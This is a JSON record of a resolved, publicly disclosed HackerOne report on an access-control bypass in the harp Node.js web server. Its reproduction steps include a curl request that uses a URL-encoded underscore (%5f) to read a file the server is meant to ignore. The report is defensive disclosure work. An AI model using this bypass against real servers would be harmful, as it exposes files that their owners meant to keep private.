{
  "id": 453820,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NTM4MjA=",
  "url": "https://hackerone.com/reports/453820",
  "title": "[harp] File access even when they have been set to be ignored.",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-12-02T12:31:43.432Z",
  "submitted_at": "2018-12-02T12:31:43.432Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skyn3t",
    "url": "/skyn3t",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-5437"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-04-06T18:09:45.904Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-04-06T18:09:37.240Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report information disclosure through file access in harp.\nIt allows to access files that are supposed to be ignored according to the harp server [rules](http://harpjs.com/docs/development/rules).\n\n\n# Module\n\n**module name:** harp\n**version:** 0.29.0\n**npm page:** `https://www.npmjs.com/package/harp`\n\n## Module Description\n\nzero-configuration web server with built in pre-processing\n\n## Module Stats\n3,576 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\n> #### Ignore those which start with underscore.\nAny files or directories that begin with underscore will be ignored by the server. This is the recommended naming convention for layout and partial files. Harp will honour this rule for both files and directories.\n\n> #### Design Rationale\nBy having a simple convention, it is easy to specify and identify which assets will not be served to the end user.\n\n> #### Example\n```\n myapp.harp.io/\n   +- public/\n       |- index.html            <-- will be served\n       |- _some-partial.jade    <-- won't be served\n       +- _shared-partials/     <-- won't be served\n           +- nav.jade\n```\n\nThis rule can be bypassed by url encoding the name of the file or directory that has been forbidden.\n\n\n## Steps To Reproduce:\n\n- Install harpjs \n\n```\nyarn global add harp\n```\n\n- Run harp server \n\n```\nharp server\n```\n\n- Create a file `_secret` which should be ignored inside project directory\n\n```\necho secret text >> _secret.txt\n```\n\n- Request the file with `curl`\n\n```\ncurl --path-as-is 0.0.0.0:9000/_secret.txt\n...\n<h1>404</h1><h2>Page Not Found</h2>\n...\n```\n\n- The url encoded value for _ is %5f. So after replacing an e with its url encoded form, we are able to access the file.\n\n```\ncurl --path-as-is 0.0.0.0:9000/%5fsecret.txt  \nsecret text\n```\n\n\n\n## Supporting Material/References:\n\n- Ubuntu 16.04\n- node v11.3.0\n- npm 6.4.1\n\n# Wrap up\n\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nThe essentially bypasses the ignore files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.",
  "weakness": {
    "id": 89,
    "name": "Information Exposure Through Directory Listing"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-05-06T18:09:37.469Z",
  "allow_singular_disclosure_after": -150663902.98085725,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "skyn3t",
    "jillianhax",
    "midle"
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18612,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "harp",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
